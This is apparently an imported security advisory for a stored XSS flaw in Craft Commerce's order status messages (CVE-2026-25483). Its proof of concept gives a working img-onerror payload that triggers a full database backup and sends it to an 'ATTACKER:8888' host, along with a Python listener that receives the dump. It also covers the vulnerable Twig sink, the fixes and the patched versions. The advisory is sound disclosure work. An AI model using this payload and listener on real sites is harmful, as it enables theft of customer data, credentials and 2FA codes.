advisory_id: GHSA-8478-rmjg-mjj5
datasource_id: github_osv_importer_v2/GHSA-8478-rmjg-mjj5
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8478-rmjg-mjj5/GHSA-8478-rmjg-mjj5.json
aliases:
  - CVE-2026-25483
summary: "Craft Commerce has Stored XSS via Order Status Message with potential database exfiltration\n\
  ## Summary\n\nA stored XSS vulnerability exists in Craft Commerce’s Order Status History Message.\
  \ The message is rendered using the `|md` filter, which permits raw HTML, enabling malicious\
  \ script execution. If a user has database backup utility permissions (which do not require\
  \ an elevated session), an attacker can exfiltrate the entire database, including all user\
  \ credentials, customer PII, order history, and 2FA recovery codes.\n\nUsers are recommended\
  \ to update to the patched 5.5.2 release to mitigate the issue.\n\n---\n## Proof of Concept\n\
  \n### Required Permissions\n\n- General\n\t- Access the control panel\n\t- Access Craft Commerce\n\
  \t- Access to the database backup utility\n- Craft Commerce\n\t- Manage orders\n\t- Edit orders\n\
  \n### Attacker Server Setup\n\nTo reproduce this attack, you need a server to receive the\
  \ exfiltrated database.\n1. Save the Python script as `receiver.py` on your attacker machine.\n\
  2. Run it: `python3 receiver.py` -- Change the port if needed.\n\n<details>\n\n<summary>Server\
  \ Python Script</summary>\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nUsage: python3 receiver.py\n\
  \"\"\"\n\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport cgi, os\nfrom\
  \ datetime import datetime\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_OPTIONS(self):\n\
  \        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin',\
  \ '*')\n        self.send_header('Access-Control-Allow-Methods', 'POST')\n        self.end_headers()\n\
  \n    def do_POST(self):\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin',\
  \ '*')\n        self.end_headers()\n        \n        content_type = self.headers.get('Content-Type',\
  \ '')\n        if 'multipart/form-data' in content_type:\n            form = cgi.FieldStorage(\n\
  \                fp=self.rfile, headers=self.headers,\n                environ={'REQUEST_METHOD':\
  \ 'POST', 'CONTENT_TYPE': content_type}\n            )\n            if 'db' in form:\n   \
  \             filename = f\"exfil_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.zip\"\n \
  \               with open(filename, 'wb') as f:\n                    f.write(form['db'].file.read())\n\
  \                print(f\"[+] DB saved: {filename} ({os.path.getsize(filename):,} bytes)\"\
  )\n        \n        self.wfile.write(b\"OK\")\n\nif __name__ == '__main__':\n    print(\"\
  [*] Listening on http://0.0.0.0:8888\")   # change the port if needed\n    HTTPServer(('0.0.0.0',\
  \ 8888), Handler).serve_forever()\n```\n\n</details>\n\n### Steps to Reproduce\n\n1. Log in\
  \ to the admin panel\n2. Navigate to **Commerce** → **Orders**\n3. Create a new order, enter\
  \ a customer email, and mark the order as completed. The Order should be saved now; if not,\
  \ save it.\n4. Edit the order\n5. Change the order status, a new text field (Status Message)\
  \ will appear once the status is changed\n    - Make sure you have multiple order statuses;\
  \ if not, create one from (/admin/commerce/settings/orderstatuses)\n6. In the **Status Message**\
  \ field, enter the XSS payload below\n7. Save/Update the order\n8. Log out & log in again\
  \ with an admin account\n9. Visit the order page (/admin/commerce/orders/{Order_ID})\n10.\
  \ XSS executes → Full database backup is triggered and exfiltrated\n11. Go back to the attacker’s\
  \ server and notice a zipped file containing the full exfiltrated database.\n\n### XSS Payload\
  \ (DB Exfiltration)\n\n**Note:** Replace `ATTACKER:8888` with your listener server.\n```html\n\
  <img src=x onerror=\"fetch('/index.php?p=admin/actions/utilities/db-backup-perform-action',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=utilities/db-backup-perform-action&CRAFT_CSRF_TOKEN='+Craft.csrfTokenValue+'&downloadBackup=1'}).then(r=>r.blob()).then(b=>{let\
  \ f=new FormData;f.append('db',b,'backup.sql');fetch('http://ATTACKER:8888/',{method:'POST',body:f})})\"\
  >\n```\n\n---\n## Technical Details (Vulnerable Code)\n\n**File:** `vendor/craftcms/commerce/src/templates/orders/_history.twig`\n\
  **Sink:** `{{ orderHistory.message | md }}`\n**Root Cause:** The `|md` Twig filter (Markdown)\
  \ processes the message but does not sanitize HTML tags.\n\n---\n## Impact\n\nThe exfiltrated\
  \ database backup includes, but is not limited to:\n- Usernames, emails, and password hashes.\n\
  - Customer PII: Names, addresses, and complete order history.\n- Transaction records, customer\
  \ profiles, and coupon codes.\n- GraphQL tokens.\n- 2FA recovery codes.\n- Potentially, payment\
  \ gateway secrets (if stored directly instead of using environment variables).\n\n**Note:**\
  \ This XSS can also be leveraged for the same attacks described in previous reports, including\
  \ privilege escalation and forced password changes.\n\n---\n## Mitigation\n\nSanitize the\
  \ message before rendering:\n```twig\n{{ orderHistory.message | md | purify }}\n```\n\nOr\
  \ escape HTML before Markdown processing:\n```twig\n{{ orderHistory.message | e | md }}\n\
  ```\n\nAdditionally, requiring an elevated session for the DB Backup utility would increase\
  \ the difficulty of exploitation, although it would not prevent the attack, as it might occur\
  \ while an active elevated session is in place.\n\n## Resources:\n\nhttps://github.com/craftcms/commerce/commit/4665a47c0961aee311a42af2ff94a7c470f0ad8c"
impacted_packages:
  - purl: pkg:composer/craftcms/commerce
    affected_versions: vers:composer/<=5.5.1
    fixed_versions: vers:composer/5.5.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:composer/craftcms/commerce
    affected_versions: vers:composer/<=4.10.0
    fixed_versions: vers:composer/4.10.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.2'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:H/SI:L/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8478-rmjg-mjj5/GHSA-8478-rmjg-mjj5.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/craftcms/commerce
    reference_type:
    reference_id:
  - url: https://github.com/craftcms/commerce/commit/4665a47c0961aee311a42af2ff94a7c470f0ad8c
    reference_type:
    reference_id:
  - url: https://github.com/craftcms/commerce/releases/tag/4.10.1
    reference_type:
    reference_id:
  - url: https://github.com/craftcms/commerce/releases/tag/5.5.2
    reference_type:
    reference_id:
  - url: https://github.com/craftcms/commerce/security/advisories/GHSA-8478-rmjg-mjj5
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25483
    reference_type:
    reference_id:
